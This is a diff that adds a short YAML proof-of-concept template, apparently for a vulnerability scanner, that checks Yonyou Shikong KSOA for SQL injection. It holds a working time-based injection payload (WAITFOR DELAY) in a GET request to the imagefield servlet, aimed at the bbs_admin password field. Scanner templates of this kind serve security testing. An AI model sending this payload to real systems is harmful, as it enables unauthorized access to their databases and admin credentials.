@@ -1,0 +1,15 @@
+id: poc-yaml-yysk-KSOA-imagefield-SQL-injection
+info:
+  name: 用友时空 KSOA  imagefield SQL 注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 用友时空KSOA
+variables:
+  t1: random_int(5,10)
+requests:
+- method: GET
+  path: /servlet/imagefield?key=readimage&sImgname=password&sTablename=bbs_admin&sKeyname=id&sKeyvalue=-1%27;WAITFOR%20DELAY%20%270:0:{{.t1}}%27--
+  expression: status_code == 200 && duration > t1 && content_type == "image/jpeg"
+    && contains(body, "")
+transport: http
